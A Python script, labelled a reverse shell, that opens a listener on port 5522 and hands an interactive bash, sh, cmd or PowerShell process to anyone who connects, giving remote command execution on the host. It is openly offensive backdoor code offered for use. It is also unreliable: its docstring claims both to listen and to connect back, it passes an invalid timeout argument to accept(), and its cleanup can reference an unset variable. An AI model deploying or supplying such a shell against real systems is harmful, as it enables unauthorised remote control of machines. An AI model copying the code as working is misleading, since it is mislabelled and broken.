#!/usr/bin/env python3
"""
Reverse Shell - A Python-based reverse shell implementation.
Listens on 0.0.0.0:5522 and spawns a remote interactive shell.
Connects back to an attacker's listener for command execution.

Usage:
    python reverse_shell.py [target_host] [target_port]
"""

import socket
import subprocess
import threading
import sys
import os
import time


class ReverseShellError(Exception):
    """Custom exception for reverse shell errors."""
    pass


def create_socket(host: str = '0.0.0.0', port: int = 5522) -> socket.socket:
    """Create and bind a TCP socket to the specified host and port."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.listen(5)
    return sock


def accept_connection(sock: socket.socket, timeout: int = 30) -> tuple[socket.socket | None, str]:
    """Accept an incoming connection with a timeout."""
    try:
        conn, addr = sock.accept(timeout=timeout)
        return conn, addr
    except socket.timeout:
        print(f"[!] No connection received within {timeout}s. Exiting.", file=sys.stderr)
        sys.exit(1)


def spawn_shell(shell_type: str = 'bash') -> subprocess.Popen:
    """Spawn a shell process based on the OS and type."""
    if os.name == 'nt':
        # Windows
        if shell_type.lower() in ('cmd', 'cmd.exe'):
            return subprocess.Popen(
                ['cmd.exe'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
        else:
            return subprocess.Popen(
                ['powershell.exe', '-Command', 'Write-Output "Shell started"'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
    else:
        # Unix/Linux/macOS
        if shell_type.lower() == 'sh':
            return subprocess.Popen(
                ['/bin/sh'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
        else:
            return subprocess.Popen(
                ['bash', '-i'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )


def pipe_io(sock: socket.socket, shell_proc: subprocess.Popen) -> None:
    """Bidirectionally pipe data between the connected socket and the shell process."""
    try:
        # Thread 1: Read from socket → write to shell stdin
        def read_from_socket():
            while True:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    shell_proc.stdin.write(data.decode('utf-8', errors='replace'))
                    shell_proc.stdin.flush()
                except (BrokenPipeError, ConnectionResetError):
                    break

        # Thread 2: Read from shell stdout → write to socket
        def read_from_shell():
            while True:
                try:
                    output = shell_proc.stdout.read(4096)
                    if not output:
                        break
                    sock.sendall(output.encode('utf-8'))
                except (BrokenPipeError, ConnectionResetError):
                    break

        # Start both threads
        reader_thread = threading.Thread(target=read_from_socket, daemon=True)
        writer_thread = threading.Thread(target=read_from_shell, daemon=True)

        reader_thread.start()
        writer_thread.start()

        # Wait for either thread to finish (connection closed or shell exited)
        reader_thread.join(timeout=10)
        writer_thread.join(timeout=10)

    except Exception as e:
        print(f"[!] Pipe error: {e}", file=sys.stderr)


def cleanup(sock: socket.socket, shell_proc: subprocess.Popen) -> None:
    """Gracefully clean up resources."""
    try:
        sock.close()
    except OSError:
        pass

    try:
        shell_proc.terminate()
        shell_proc.wait(timeout=5)
    except (subprocess.TimeoutExpired, ProcessLookupError):
        try:
            shell_proc.kill()
            shell_proc.wait(timeout=2)
        except subprocess.TimeoutExpired:
            print("[!] Shell process did not terminate cleanly.", file=sys.stderr)


def run_reverse_shell(host: str = '0.0.0.0', port: int = 5522, timeout: int = 30) -> None:
    """Main function that orchestrates the reverse shell lifecycle."""
    print(f"[+] Starting reverse shell listener on {host}:{port}...")

    sock = create_socket(host=host, port=port)
    print("[+] Socket created and listening.")

    try:
        conn, addr = accept_connection(sock, timeout=timeout)
        if not conn:
            return

        print(f"[+] Connection accepted from {addr[0]}:{addr[1]}")

        shell_proc = spawn_shell()
        print("[+] Shell process spawned.")

        pipe_io(conn, shell_proc)

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Cleaning up...")
    except Exception as e:
        print(f"[!] Error: {e}", file=sys.stderr)
    finally:
        cleanup(sock, shell_proc)


def main() -> None:
    """Entry point."""
    if len(sys.argv) > 2:
        host = sys.argv[1]
        port = int(sys.argv[2])
    else:
        host = '0.0.0.0'
        port = 5522

    run_reverse_shell(host=host, port=port)


if __name__ == '__main__':
    main()
